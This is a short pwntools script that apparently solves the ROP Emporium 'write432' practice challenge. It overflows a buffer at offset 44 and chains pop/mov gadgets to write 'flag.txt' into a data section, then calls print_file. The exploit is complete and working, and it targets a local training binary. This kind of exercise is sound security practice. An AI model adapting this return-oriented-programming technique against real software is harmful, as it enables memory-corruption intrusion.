#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./write432")

offset = 44
junk = b"A" * offset

data = 0x0804a018

print_file = p32(0x80483d0)

mov_edi_ebp = p32(0x08048543)
pop_edi_ebp = p32(0x080485aa)

payload  = b""
payload += junk
payload += pop_edi_ebp + p32(data) + b"flag"
payload += mov_edi_ebp
payload += pop_edi_ebp + p32(data + 4) + b".txt"
payload += mov_edi_ebp
payload += print_file
payload += b"B" * 4
payload += p32(data)

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
